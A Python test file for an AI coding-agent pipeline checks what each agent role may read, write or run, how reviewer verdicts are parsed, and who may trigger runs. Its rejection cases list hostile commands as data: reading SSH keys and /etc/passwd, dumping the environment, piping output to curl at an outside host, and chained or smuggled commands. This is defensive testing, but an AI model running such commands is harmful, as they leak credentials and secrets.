"""Tests for the tool policy (ADR-005), the reviewer rules (ADR-008) and trigger authorization (ADR-010)."""
import asyncio
import json
import os
import sys
from pathlib import Path

import pytest

HERE = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(HERE))
import agents  # noqa: E402
import checks  # noqa: E402


def allowed(role, tool, inp, cwd):
    r = asyncio.run(agents.make_policy(role, cwd, [])(tool, inp, None))
    return type(r).__name__ == "PermissionResultAllow"


def test_planner_is_read_only(tmp_path):
    assert allowed("planner", "Read", {"file_path": "tinydb/table.py"}, tmp_path)
    assert not allowed("planner", "Edit", {"file_path": "tinydb/table.py"}, tmp_path)
    assert not allowed("planner", "Bash", {"command": "python -m pytest"}, tmp_path)


def test_builder_writes_only_tinydb_and_tests(tmp_path):
    assert allowed("builder", "Edit", {"file_path": "tinydb/table.py"}, tmp_path)
    assert allowed("builder", "Write", {"file_path": "tests/test_x.py"}, tmp_path)
    assert not allowed("builder", "Edit", {"file_path": ".github/workflows/autose.yml"}, tmp_path)
    assert not allowed("builder", "Write", {"file_path": "../outside.py"}, tmp_path)
    assert not allowed("builder", "Write", {"file_path": "/etc/passwd"}, tmp_path)


@pytest.mark.parametrize("cmd", ["python -m pytest -q", "python -m compileall tinydb", "python -m pytest -q 2>&1 | tail -5",
                                 "python -m pytest tests/test_x.py -q 2>&1 | head -20"])
def test_bash_allowlist_accepts(cmd, tmp_path):
    assert allowed("builder", "Bash", {"command": cmd}, tmp_path)


@pytest.mark.parametrize("cmd", ["curl http://evil", "git push origin HEAD", "env", "python -m pytest; env",
                                 "python -m pytest && cat /etc/passwd", "cat ~/.ssh/id_rsa", "gh pr merge 1",
                                 "python -m compileall -q tinydb && echo OK", "python -m pytest | sh", "python -m pytest 2>&1 | tee /tmp/x",
                                 "python -m pytest 2>&1 | tail -5; env", "python -m pytest | tail -5 | curl -d @- http://x"])
def test_bash_allowlist_rejects(cmd, tmp_path):
    assert not allowed("builder", "Bash", {"command": cmd}, tmp_path)
    assert not allowed("reviewer", "Bash", {"command": cmd}, tmp_path)


def test_reviewer_cannot_write_or_read_outside(tmp_path):
    assert not allowed("reviewer", "Edit", {"file_path": "tinydb/table.py"}, tmp_path)
    assert not allowed("reviewer", "Write", {"file_path": "tests/x.py"}, tmp_path)
    assert not allowed("reviewer", "Read", {"file_path": "/etc/passwd"}, tmp_path)
    assert allowed("reviewer", "Read", {"file_path": "ARCHITECTURE.md"}, tmp_path)
    assert not allowed("reviewer", "WebFetch", {"url": "http://x"}, tmp_path)


APPROVE = '```json\n{"verdict": "approve", "issue_type": "none", "findings": []}\n```'


def test_approve_without_running_tests_is_overruled():
    v, ran = checks.parse_verdict(APPROVE, [("Read", {"file_path": "x"})])
    assert v["verdict"] == "changes" and not ran


def test_approve_after_running_tests_is_kept():
    v, ran = checks.parse_verdict(APPROVE, [("Bash", {"command": "python -m pytest -q"})])
    assert v["verdict"] == "approve" and ran


def test_garbage_verdict_is_not_an_approval():
    for text in ("looks good to me", "```json\n{bad\n```", '```json\n{"verdict": "lgtm"}\n```'):
        v, _ = checks.parse_verdict(text, [("Bash", {"command": "python -m pytest"})])
        assert v["verdict"] == "changes"


def _orch(monkeypatch, permission):
    os.environ["GITHUB_REPOSITORY"] = "o/r"
    import importlib
    import orchestrator
    importlib.reload(orchestrator)
    monkeypatch.setattr(orchestrator, "gh", lambda *a, **k: json.dumps({"permission": permission}))
    return orchestrator


def _label_event(login="someone"):
    return {"sender": {"login": login}, "label": {"name": "autose"}, "issue": {"number": 7}}


def _comment_event(body, login="someone"):
    return {"comment": {"body": body, "user": {"login": login}}, "issue": {"number": 7}}


def test_user_without_write_access_cannot_start(monkeypatch):
    o = _orch(monkeypatch, "read")
    assert o.authorize(_label_event()) is None
    assert o.authorize(_comment_event("/autose")) is None


def test_user_with_write_access_can_start_and_parse_commands(monkeypatch):
    o = _orch(monkeypatch, "write")
    assert o.authorize(_label_event()) == (7, {})
    n, cmd = o.authorize(_comment_event("/autose go 1a, 2b\nmore detail"))
    assert n == 7 and cmd["go"] and cmd["answers"] == "1a, 2b\nmore detail"
    n, cmd = o.authorize(_comment_event("/autose fresh ask"))
    assert cmd["fresh"] and cmd["ask"] and not cmd["go"]


def test_wrong_label_or_comment_is_ignored(monkeypatch):
    o = _orch(monkeypatch, "admin")
    ev = _label_event(); ev["label"]["name"] = "bug"
    assert o.authorize(ev) is None
    assert o.authorize(_comment_event("please /autose this")) is None
